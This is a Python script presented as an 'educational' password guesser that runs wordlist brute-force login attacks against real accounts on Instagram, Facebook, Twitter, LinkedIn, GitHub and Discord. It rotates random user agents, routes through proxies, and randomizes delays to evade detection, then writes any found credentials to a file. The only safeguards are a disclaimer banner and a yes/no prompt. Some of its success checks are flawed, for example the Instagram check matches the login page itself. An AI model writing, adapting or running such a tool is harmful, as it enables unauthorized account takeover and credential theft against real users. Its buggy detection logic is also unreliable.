#!/usr/bin/env python3
"""
Password Guesser Tool - Educational Purpose Only
"""

import requests
import time
import random
import argparse
import sys
from colorama import init, Fore, Style
from fake_useragent import UserAgent

# Initialize colorama for colored output
init()

class PasswordGuesser:
    def __init__(self, username, wordlist, platform='all', delay=2, proxy=None, verbose=False):
        self.username = username
        self.wordlist = wordlist
        self.platform = platform
        self.base_delay = delay
        self.proxy = proxy
        self.verbose = verbose
        self.ua = UserAgent()
        
        # Target URLs for different platforms
        self.target_urls = {
            "instagram": "https://www.instagram.com/accounts/login/",
            "facebook": "https://www.facebook.com/login.php",
            "twitter": "https://twitter.com/i/flow/login",
            "linkedin": "https://www.linkedin.com/login",
            "github": "https://github.com/login",
            "discord": "https://discord.com/login"
        }
        
        # Platform-specific indicators
        self.success_indicators = {
            "instagram": ["instagram.com/accounts/login/"],
            "facebook": ["facebook.com/home.php", "facebook.com/?sk=welcome"],
            "twitter": ["twitter.com/home"],
            "linkedin": ["linkedin.com/feed"],
            "github": ["github.com"],
            "discord": ["discord.com/channels"]
        }
    
    def load_passwords(self):
        """Load passwords from wordlist file"""
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            if self.verbose:
                print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords{Style.RESET_ALL}")
            return passwords
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Password file '{self.wordlist}' not found.{Style.RESET_ALL}")
            sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading password file: {e}{Style.RESET_ALL}")
            sys.exit(1)
    
    def test_login(self, url, password, platform):
        """Test a single login attempt"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        # Platform-specific payload structure
        payloads = {
            "instagram": {'username': self.username, 'password': password},
            "facebook": {'email': self.username, 'pass': password},
            "twitter": {'session[username_or_email]': self.username, 'session[password]': password},
            "linkedin": {'session_key': self.username, 'session_password': password},
            "github": {'login': self.username, 'password': password},
            "discord": {'email': self.username, 'password': password}
        }
        
        payload = payloads.get(platform, {'username': self.username, 'password': password})
        
        try:
            # Configure proxy if specified
            proxies = None
            if self.proxy:
                proxies = {'http': self.proxy, 'https': self.proxy}
            
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                proxies=proxies,
                timeout=10,
                allow_redirects=True
            )
            
            # Check for success indicators
            success = False
            indicators = self.success_indicators.get(platform, [])
            
            for indicator in indicators:
                if indicator in response.url:
                    success = True
                    break
            
            if self.verbose:
                print(f"{Fore.CYAN}[*] Response URL: {response.url}{Style.RESET_ALL}")
            
            return success, response
            
        except requests.exceptions.Timeout:
            print(f"{Fore.YELLOW}[!] Timeout for password '{password}'{Style.RESET_ALL}")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.YELLOW}[!] Connection error for password '{password}'{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error: {e}{Style.RESET_ALL}")
        
        return False, None
    
    def run_attack(self):
        """Main attack function"""
        passwords = self.load_passwords()
        
        # Determine which platforms to attack
        if self.platform.lower() == 'all':
            platforms_to_attack = self.target_urls.items()
        else:
            platforms_to_attack = [(self.platform, self.target_urls.get(self.platform.lower()))]
            if not platforms_to_attack[0][1]:
                print(f"{Fore.RED}[!] Unknown platform: {self.platform}{Style.RESET_ALL}")
                print(f"Available platforms: {', '.join(self.target_urls.keys())}")
                sys.exit(1)
        
        for platform_name, login_url in platforms_to_attack:
            print(f"\n{Fore.BLUE}[*] Starting attack on {platform_name}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Target: {login_url}{Style.RESET_ALL}")
            
            attempt_count = 0
            for password in passwords:
                attempt_count += 1
                print(f"{Fore.YELLOW}[{attempt_count}/{len(passwords)}] Trying: {password}{Style.RESET_ALL}")
                
                success, response = self.test_login(login_url, password, platform_name)
                
                if success:
                    print(f"\n{Fore.GREEN}[✓] SUCCESS! Credentials found:{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Username: {self.username}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Password: {password}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Platform: {platform_name}{Style.RESET_ALL}")
                    
                    # Save to file
                    with open('found_credentials.txt', 'a') as f:
                        f.write(f"{platform_name}:{self.username}:{password}\n")
                    
                    return True
                
                # Add random delay between attempts
                delay = random.uniform(self.base_delay, self.base_delay * 2)
                if self.verbose:
                    print(f"{Fore.CYAN}[*] Waiting {delay:.2f} seconds...{Style.RESET_ALL}")
                time.sleep(delay)
            
            print(f"{Fore.RED}[✗] No valid credentials found for {platform_name}{Style.RESET_ALL}")
        
        return False

def main():
    parser = argparse.ArgumentParser(
        description='Password Guesser Tool - Educational Purpose Only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python guesser.py --username admin --wordlist passwords.txt
  python guesser.py -u john@email.com -w common.txt -p facebook
  python guesser.py -u testuser -w wordlist.txt --delay 5 --verbose
        """
    )
    
    parser.add_argument('-u', '--username', required=True, help='Target username/email')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to password wordlist file')
    parser.add_argument('-p', '--platform', default='all', 
                       help='Target platform (instagram, facebook, twitter, linkedin, github, discord) or "all"')
    parser.add_argument('-d', '--delay', type=float, default=2.0,
                       help='Delay between attempts in seconds (default: 2.0)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--version', action='version', version='Password Guesser 1.0')
    
    args = parser.parse_args()
    
    # Print banner
    print(f"""
{Fore.RED}╔══════════════════════════════════════╗
║     Password Guesser Tool v1.0        ║
║   {Fore.YELLOW}For Educational Use Only{Fore.RED}        ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
    """)
    
    # Confirm user understands
    print(f"{Fore.YELLOW}[!] WARNING: This tool is for educational purposes only!")
    print(f"[!] Unauthorized access to computer systems is illegal.")
    print(f"[!] You are responsible for complying with all applicable laws.{Style.RESET_ALL}")
    
    confirm = input("\nDo you understand and wish to continue? (yes/no): ")
    if confirm.lower() not in ['yes', 'y']:
        print("Exiting...")
        sys.exit(0)
    
    # Create and run the attacker
    attacker = PasswordGuesser(
        username=args.username,
        wordlist=args.wordlist,
        platform=args.platform,
        delay=args.delay,
        proxy=args.proxy,
        verbose=args.verbose
    )
    
    success = attacker.run_attack()
    
    if success:
        print(f"\n{Fore.GREEN}[✓] Attack completed successfully!{Style.RESET_ALL}")
        print("Credentials saved to 'found_credentials.txt'")
    else:
        print(f"\n{Fore.RED}[✗] Attack completed - no credentials found.{Style.RESET_ALL}")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
